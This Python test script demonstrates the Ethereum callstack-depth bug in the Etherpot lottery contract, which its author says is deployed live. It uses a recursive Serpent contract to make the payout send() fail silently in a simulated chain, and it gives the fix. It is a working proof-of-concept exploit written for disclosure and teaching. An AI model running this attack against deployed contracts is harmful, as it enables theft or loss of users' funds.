# test_etherpot.py - Andrew Miller <amiller@cs.umd.edu> Aug 27, 2015
# 
# This test file illustrates a hazard in Ethereum programming: namely,
# that a send() instruction can fail if the callstack reaches depth 1024.
#
# It's a common mistake not to check whether send() succeeded.
# Even if it fails, a naive contract might carry on with its execution,
# modifying state or sending other messages.
#
# An attacker can exploit this by sending a message to the flawed contract
# with the callstack already preloaded at depth 1023.
#
# This flaw is present in the Etherpot example, which is *ALREADY DEPLOYED* 
# on the live Frontier network, with real Ether at stake. The following 
# pyethereum code demonstrates the problem.
#
# The right thing to do is to check the return code from send(), and
# abort the transaction if it fails.
#
# Requirements:
#    pyethereum 
# How to run:
#    python test_etherpot.py
#
# History:
# - This contract-writing hazard was reported in the Least Authority
#     security / incentives analysis
#      https://github.com/LeastAuthority/ethereum-analyses/blob/master/GasEcon.md#callstack-depth-limit-errors

# - See also:
#      Step by Step Towards Creating a Safe Smart Contract: Lessons and Insights from a Cryptocurrency Lab
#      Kevin Delmolino, Mitchell Arnett, Ahmed Kosba, Andrew Miller, and Elaine Shi
#      https://eprint.iacr.org/2015/460
#

from ethereum import tester
from ethereum import processblock
from ethereum import slogging
slogging.set_level('eth.pb.tx', 'warning')
slogging.set_level('eth.vm.log', 'trace')

# This code defines a function recurse(n), that loads up the callstack
# with `n` nested calls, and finally calls the trigger() function of
# a victim contract.
#
# Note: I found it easier to write this sort of code in Serpent than Solidity,
#  because in Solidity I ran out of stack space (value stack, not callstack).
#  This is probably due to my inexperience with Solidity.

recurse_code = """
extern c1: [trigger]
def recurse(c1, n):
    if n == 0: 
      c1.trigger()
    else: 
      self.recurse(c1, n-1)
"""

def test_recursive(n=1021):
    s = tester.state()
    tester.gas_limit = 2000000

    recurser = s.abi_contract(recurse_code, language='serpent')

    # Create the lotto contract
    contract = s.abi_contract(open('lotto.sol').read(), language='solidity')
    print 'lotto done'

    # Send some money to the lotto
    contract.send(value=100000000000000000, sender=tester.k2)
    
    print 'Contract balance:', s.block.get_balance(contract.address)
    print 'isCashed:', contract.getIsCashed(0, 0)
    
    print 'Mining ten blocks (for pretend)...,'
    s.mine(n=10, coinbase=tester.a0)

    # Load up the callstack to depth-n, then try to 'cash' the lotto
    recurser.recurse(contract.address, n)
    print 'Final contract balance:', s.block.get_balance(contract.address)
    print 'isCashed:', contract.getIsCashed(0, 0)
    
    # Check if the attack worked
    if contract.getIsCashed(0, 0) and s.block.get_balance(contract.address) > 0:
        print '==============================='
        print 'INVARIANT VIOLATION DETECTED!!!'
        print '==============================='
        print 'isCashed was set, but the payout was never made!'
    
print 'Trying with n=1021 (should be OK)'
test_recursive(n=1021)
print 'Trying with n=1023 (should fail, but that is OK)'
try:
    test_recursive(n=1023)
except: 
    print 'benign exception caught'
print 'Trying with n=1022 (uh oh....)'
test_recursive(n=1022)
